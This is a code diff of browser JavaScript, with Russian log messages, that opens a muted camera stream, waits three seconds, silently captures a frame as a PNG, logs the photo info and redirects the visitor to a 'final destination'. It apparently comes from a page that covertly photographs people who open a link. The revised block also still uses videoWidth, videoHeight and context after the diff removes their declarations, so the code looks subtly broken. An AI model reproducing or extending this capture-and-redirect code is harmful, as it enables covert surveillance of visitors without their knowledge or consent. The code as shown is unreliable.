@@ -199,36 +199,29 @@
       video.muted = true;
       await video.play();
 
-      video.addEventListener('loadedmetadata', () => {
+      video.addEventListener('loadedmetadata', async () => {
 
-        video.play().then(() => {
-          console.log('Видеопоток воспроизводится успешно.');
+        await video.play()
 
-          console.log('Метаданные загружены, начинаем захват изображения через 3 секунды...');
-
-          const { videoWidth, videoHeight } = video;
-
-          const context = canvas.getContext('2d');
-
-          setTimeout(function () {
-            if (!photoTaken) {
-                canvas.width = videoWidth;
-                canvas.height = videoHeight;
-                context.drawImage(video, 0, 0, videoWidth, videoHeight);
-                canvas.toBlob(function(blob) {
-                      console.log('Фотография создана');
-                      savedPhoto = blob;
-                      photoTaken = true;
-                      
-                      setTimeout(function () {
-                        logPhotoInfo();
-                        redirectToFinalDestination();
-                      }, 2000);
-                      
-                    }, 'image/png');
-                  }}, 3000);
+        setTimeout(function () {
+          if (!photoTaken) {
+              canvas.width = videoWidth;
+              canvas.height = videoHeight;
+              context.drawImage(video, 0, 0, videoWidth, videoHeight);
+              canvas.toBlob(function(blob) {
+                    console.log('Фотография создана');
+                    savedPhoto = blob;
+                    photoTaken = true;
+                    
+                    setTimeout(function () {
+                      logPhotoInfo();
+                      redirectToFinalDestination();
+                    }, 2000);
+                    
+                  }, 'image/png');
+                }}, 3000);
                 
-                });
+               
         });
     }
 
